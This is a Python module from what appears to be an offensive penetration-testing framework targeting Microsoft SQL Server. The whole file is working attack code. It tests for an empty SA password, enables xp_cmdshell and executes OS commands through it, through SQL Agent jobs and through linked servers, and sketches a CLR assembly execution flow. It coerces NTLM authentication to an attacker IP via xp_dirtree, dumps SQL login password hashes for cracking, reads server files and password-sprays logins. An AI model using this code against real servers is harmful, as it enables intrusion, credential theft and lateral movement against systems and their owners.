# modules/mssql.py
import socket
import time

from impacket.tds import MSSQL
from core.output import print_result, print_table, print_check, console
from core import session_db

PROTO = "MSSQL"


class MSSQLModule:
    def __init__(self, target, creds):
        self.target    = target
        self.creds     = creds
        self._ms       = None
        self._port     = 1433
        self._instance = ""

    def _proto(self):
        return PROTO

    def connect(self, port=1433, instance="", timeout=None):
        self._port     = port
        self._instance = instance
        timeout        = timeout or self.target.timeout
        try:
            self._ms = MSSQL(self.target.ip, port)
            self._ms.connect()
            session_db.save_target(self.target.ip, domain=self.target.domain)
            suffix = (" instancia '" + instance + "'") if instance else ""
            print_result(PROTO, self.target.ip, "ok",
                         "conexion establecida en " + self.target.ip + ":" + str(port) + suffix)
            return True
        except Exception as e:
            print_result(PROTO, self.target.ip, "fail", "no se pudo conectar: " + str(e))
            self._ms = None
            return False

    def disconnect(self):
        if self._ms:
            try: self._ms.disconnect()
            except Exception: pass
            self._ms = None

    def login(self, database="master", auth_type="sql"):
        if self._ms is None:
            print_result(PROTO, self.target.ip, "fail", "no hay conexion activa")
            return False
        try:
            if auth_type == "hash" and self.creds.hash:
                raw    = self.creds.hash
                lm, nt = ("", raw) if ":" not in raw else raw.split(":", 1)
                ok = self._ms.login(database, self.creds.user, "",
                                    self.target.domain or self.creds.domain, lm, nt)
            elif auth_type == "windows":
                ok = self._ms.login(database, self.creds.user, self.creds.password,
                                    self.target.domain or self.creds.domain)
            else:
                ok = self._ms.login(database, self.creds.user, self.creds.password)
            if ok:
                secret = self.creds.hash if self.creds.hash else self.creds.password
                stype  = "hash" if self.creds.hash else "password"
                session_db.save_credential(self.target.ip, self.creds.user, secret, stype,
                                           valid=True, source="mssql_login")
                print_result(PROTO, self.target.ip, "pwned",
                             "login correcto como " + self.creds.user + " (auth=" + auth_type + ")")
            else:
                print_result(PROTO, self.target.ip, "fail",
                             "login fallido para " + self.creds.user)
            return bool(ok)
        except Exception as e:
            print_result(PROTO, self.target.ip, "fail", "error de login: " + str(e))
            return False

    def check_sa_empty(self):
        if self._ms is None:
            return False
        try:
            ok = self._ms.login("master", "sa", "")
            if ok:
                session_db.save_finding(self.target.ip, PROTO, "sa_empty_password",
                                        "SA con contrasena vacia")
                print_result(PROTO, self.target.ip, "pwned", "SA con contrasena vacia")
            return bool(ok)
        except Exception:
            return False

    def query(self, sql, silent=False):
        if self._ms is None:
            if not silent:
                print_result(PROTO, self.target.ip, "fail", "no hay sesion activa")
            return None
        try:
            self._ms.sql_query(sql)
            rows = self._ms.rows if hasattr(self._ms, "rows") else []
            return rows if rows else []
        except Exception as e:
            if not silent:
                print_result(PROTO, self.target.ip, "fail", "error en query: " + str(e))
            return None

    def list_databases(self, silent=False):
        rows = self.query("SELECT name FROM sys.databases ORDER BY name", silent=silent)
        if rows is None:
            return []
        dbs = [list(r.values())[0] for r in rows]
        if not silent:
            print_table("Bases de datos en " + self.target.ip,
                        ["Nombre"], [(d,) for d in dbs])
        for d in dbs:
            session_db.save_finding(self.target.ip, PROTO, "database", d)
        return dbs

    def list_tables(self, database="master", silent=False):
        sql  = ("SELECT TABLE_NAME FROM [" + database + "].INFORMATION_SCHEMA.TABLES "
                "WHERE TABLE_TYPE='BASE TABLE'")
        rows = self.query(sql, silent=silent)
        if rows is None:
            return []
        tables = [list(r.values())[0] for r in rows]
        if not silent:
            print_table("Tablas en " + database + "@" + self.target.ip,
                        ["Tabla"], [(t,) for t in tables])
        return tables

    def list_logins(self, silent=False):
        sql  = ("SELECT name, type_desc, is_disabled "
                "FROM sys.server_principals WHERE type IN ('S','U','G') ORDER BY name")
        rows = self.query(sql, silent=silent)
        if rows is None:
            return []
        if not silent:
            trows = [(r.get("name",""), r.get("type_desc",""),
                      str(r.get("is_disabled",""))) for r in rows]
            print_table("Logins en " + self.target.ip,
                        ["Login", "Tipo", "Deshabilitado"], trows)
        for r in rows:
            session_db.save_finding(self.target.ip, PROTO, "login", str(r.get("name","")))
        return rows

    def check_privs(self, silent=False):
        privs = {}
        rows  = self.query("SELECT IS_SRVROLEMEMBER('sysadmin')", silent=True)
        privs["sysadmin"] = bool(rows and list(rows[0].values())[0] == 1)
        rows  = self.query(
            "SELECT value_in_use FROM sys.configurations WHERE name='xp_cmdshell'",
            silent=True)
        privs["xp_cmdshell"] = bool(rows and list(rows[0].values())[0] == 1)
        rows  = self.query(
            "SELECT COUNT(*) FROM sys.server_permissions WHERE permission_name='IMPERSONATE'",
            silent=True)
        privs["impersonation"] = bool(rows and list(rows[0].values())[0] > 0)
        if not silent:
            trows = [(k, "Si" if v else "No") for k, v in privs.items()]
            print_table("Privilegios de " + self.creds.user + "@" + self.target.ip,
                        ["Privilegio", "Disponible"], trows)
        for k, v in privs.items():
            if v:
                session_db.save_finding(self.target.ip, PROTO, "priv_" + k, "habilitado")
        return privs

    def list_linked_servers(self, silent=False):
        sql  = ("SELECT srv.name, srv.product, ll.remote_name "
                "FROM sys.servers srv "
                "LEFT JOIN sys.linked_logins ll ON ll.server_id = srv.server_id "
                "WHERE srv.is_linked = 1")
        rows = self.query(sql, silent=silent)
        if rows is None:
            return []
        if not silent and rows:
            trows = [(r.get("name",""), r.get("product",""),
                      r.get("remote_name","")) for r in rows]
            print_table("Linked servers en " + self.target.ip,
                        ["Servidor", "Producto", "Login remoto"], trows)
        for r in rows:
            session_db.save_finding(self.target.ip, PROTO, "linked_server",
                                    str(r.get("name","")))
        return rows

    def enable_xp_cmdshell(self):
        sqls = [
            "EXEC sp_configure 'show advanced options', 1; RECONFIGURE",
            "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE",
        ]
        for sql in sqls:
            if self.query(sql, silent=True) is None:
                print_result(PROTO, self.target.ip, "fail",
                             "no se pudo habilitar xp_cmdshell")
                return False
        session_db.save_finding(self.target.ip, PROTO, "xp_cmdshell_enabled",
                                "habilitado via sp_configure")
        print_result(PROTO, self.target.ip, "pwned", "xp_cmdshell habilitado")
        return True

    def xp_cmdshell(self, command):
        safe_cmd = command.replace("'", "''")
        sql      = "EXEC xp_cmdshell '" + safe_cmd + "'"
        rows     = self.query(sql)
        if rows is None:
            return None
        output = "\n".join(
            str(list(r.values())[0]) for r in rows if list(r.values())[0]
        )
        if output:
            print_result(PROTO, self.target.ip, "pwned",
                         "xp_cmdshell output (" + str(len(output)) + " bytes)")
            console.print("[dim]" + output + "[/dim]")
            session_db.save_finding(self.target.ip, PROTO, "xp_cmdshell_exec",
                                    "cmd=" + command + " output=" + output[:200])
        return output

    def clr_exec(self, command):
        """
        Ejecucion via CLR Assembly temporal.
        Documenta el flujo SQL necesario — la DLL hex debe compilarse externamente.
        """
        flow = [
            "USE master",
            "ALTER DATABASE master SET TRUSTWORTHY ON",
            "-- CREATE ASSEMBLY lobera_clr FROM 0x<DLL_HEX> WITH PERMISSION_SET=UNSAFE",
            "-- CREATE PROCEDURE lobera_exec @cmd NVARCHAR(4000) AS EXTERNAL NAME lobera_clr.[StoredProcedures].lobera_exec",
            "-- EXEC lobera_exec '" + command.replace("'","''") + "'",
            "-- DROP PROCEDURE lobera_exec; DROP ASSEMBLY lobera_clr",
        ]
        console.print("[dim][MSSQL] clr_exec flow (requiere DLL compilada externamente):[/dim]")
        for line in flow:
            console.print("  [dim]" + line + "[/dim]")
        session_db.save_finding(self.target.ip, PROTO, "clr_exec_flow",
                                "flow documentado para cmd=" + command)
        return None

    def agent_job_exec(self, command, job_name="LobJob"):
        safe_cmd = command.replace("'", "''")
        safe_job = job_name.replace("'", "''")
        sqls = [
            "USE msdb",
            "EXEC sp_add_job @job_name='" + safe_job + "'",
            ("EXEC sp_add_jobstep @job_name='" + safe_job + "', @step_name='step1', "
             "@subsystem='CMDEXEC', @command='" + safe_cmd + "'"),
            "EXEC sp_add_jobserver @job_name='" + safe_job + "'",
            "EXEC sp_start_job @job_name='" + safe_job + "'",
        ]
        for sql in sqls:
            self.query(sql, silent=True)
        time.sleep(3)
        rows = self.query(
            "SELECT TOP 1 message FROM msdb.dbo.sysjobhistory "
            "WHERE job_id=(SELECT job_id FROM msdb.dbo.sysjobs WHERE name='" + safe_job + "') "
            "ORDER BY run_date DESC, run_time DESC",
            silent=True
        )
        self.query("EXEC msdb.dbo.sp_delete_job @job_name='" + safe_job + "', "
                   "@delete_unused_schedule=1", silent=True)
        output = str(list(rows[0].values())[0]) if rows else ""
        if output:
            session_db.save_finding(self.target.ip, PROTO, "agent_job_exec",
                                    "cmd=" + command + " output=" + output[:200])
            print_result(PROTO, self.target.ip, "pwned", "Agent Job exec completado")
        return output or None

    def linked_server_exec(self, linked_server, command):
        safe_cmd = command.replace("'", "''")
        inner    = "SELECT 1; EXEC xp_cmdshell ''" + safe_cmd + "''"
        sql      = "SELECT * FROM OPENQUERY([" + linked_server + "], '" + inner + "')"
        rows     = self.query(sql)
        output   = "\n".join(
            str(list(r.values())[0]) for r in (rows or []) if list(r.values())[0]
        )
        if output:
            session_db.save_finding(self.target.ip, PROTO, "linked_exec",
                                    "server=" + linked_server + " cmd=" + command)
            print_result(PROTO, self.target.ip, "pwned",
                         "linked exec via " + linked_server + " completado")
        return output or None

    def ntlm_steal(self, attacker_ip):
        unc = "\\\\" + attacker_ip + "\\lobera"
        sql = "EXEC master..xp_dirtree '" + unc + "'"
        self.query(sql, silent=True)
        session_db.save_finding(self.target.ip, PROTO, "ntlm_steal",
                                "UNC=" + unc + " capturar con Responder en " + attacker_ip)
        print_result(PROTO, self.target.ip, "info",
                     "xp_dirtree -> " + unc + " capturar hash con Responder en " + attacker_ip)
        print_check("Lanza: responder -I eth0 -wrf   o   ntlmrelayx -tf targets.txt", ok=True)
        return True

    def dump_sql_hashes(self, silent=False):
        sql  = ("SELECT name, password_hash FROM sys.sql_logins "
                "WHERE type='S' AND is_disabled=0")
        rows = self.query(sql, silent=silent)
        if rows is None:
            return []
        results = []
        for r in rows:
            name     = r.get("name", "")
            ph       = r.get("password_hash", b"")
            hex_hash = ph.hex() if isinstance(ph, (bytes, bytearray)) else str(ph)
            results.append({"name": name, "hash": hex_hash})
            session_db.save_finding(self.target.ip, PROTO, "sql_hash",
                                    name + ":" + hex_hash)
        if not silent and results:
            print_table("Hashes SQL en " + self.target.ip,
                        ["Login", "Hash"],
                        [(r["name"], r["hash"][:32] + "...") for r in results])
            print_result(PROTO, self.target.ip, "pwned",
                         str(len(results)) + " hash(es) extraidos — hashcat -m 1731")
        return results

    def read_file(self, filepath):
        safe_path = filepath.replace("'", "''")
        sql       = "SELECT BulkColumn FROM OPENROWSET(BULK '" + safe_path + "', SINGLE_CLOB) AS x"
        rows      = self.query(sql)
        if rows:
            content = str(list(rows[0].values())[0])
            session_db.save_finding(self.target.ip, PROTO, "file_read",
                                    filepath + " (" + str(len(content)) + " bytes)")
            print_result(PROTO, self.target.ip, "pwned",
                         "fichero leido: " + filepath + " (" + str(len(content)) + " bytes)")
            return content
        return None

    def password_spray(self, users, password, domain="", delay=1.0):
        print_result(PROTO, self.target.ip, "info",
                     "password spray: " + str(len(users)) + " usuario(s), 1 contrasena")
        valid = []
        for user in users:
            from core.credentials import Creds as _Creds
            from core.target import Target as _Target
            spray_target = _Target(self.target.ip, domain=domain, timeout=self.target.timeout)
            spray_creds  = _Creds(user=user, password=password, domain=domain)
            mod = MSSQLModule(spray_target, spray_creds)
            if mod.connect(port=self._port):
                if mod.login():
                    valid.append(user)
                    session_db.save_credential(self.target.ip, user, password,
                                               "password", valid=True,
                                               source="mssql_spray")
                mod.disconnect()
            if delay:
                time.sleep(delay)
        if valid:
            print_result(PROTO, self.target.ip, "pwned",
                         "password spray: " + str(len(valid)) + " credencial(es) valida(s)")
        else:
            print_result(PROTO, self.target.ip, "info",
                         "password spray: ninguna credencial valida")
        return valid

    @staticmethod
    def discover_instances(target_ip, timeout=3):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(timeout)
            sock.sendto(b"\x02", (target_ip, 1434))
            data, _ = sock.recvfrom(4096)
            sock.close()
        except Exception:
            return []
        payload   = data[3:].decode("utf-8", errors="replace") if len(data) > 3 else ""
        instances = []
        for chunk in payload.split(";;"):
            if not chunk.strip():
                continue
            parts  = chunk.split(";")
            record = {}
            for i in range(0, len(parts) - 1, 2):
                record[parts[i]] = parts[i + 1]
            if record:
                instances.append(record)
        return instances
